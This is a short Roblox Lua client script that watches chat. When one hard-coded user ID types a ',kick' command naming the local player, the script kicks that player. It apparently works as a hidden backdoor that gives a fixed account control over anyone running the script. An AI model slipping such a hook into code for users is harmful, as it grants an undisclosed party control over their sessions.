local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function onChat(player)
    player.Chatted:Connect(function(msg)
        if player.UserId == 8793342962 then
            local targetId = msg:match("^,kick%s+(%d+)$")
            if targetId and tonumber(targetId) == LocalPlayer.UserId then
                LocalPlayer:Kick("You were kicked by rWeFrRoblox.")
            end
        end
    end)
end

for _, player in pairs(Players:GetPlayers()) do
    onChat(player)
end

Players.PlayerAdded:Connect(onChat)
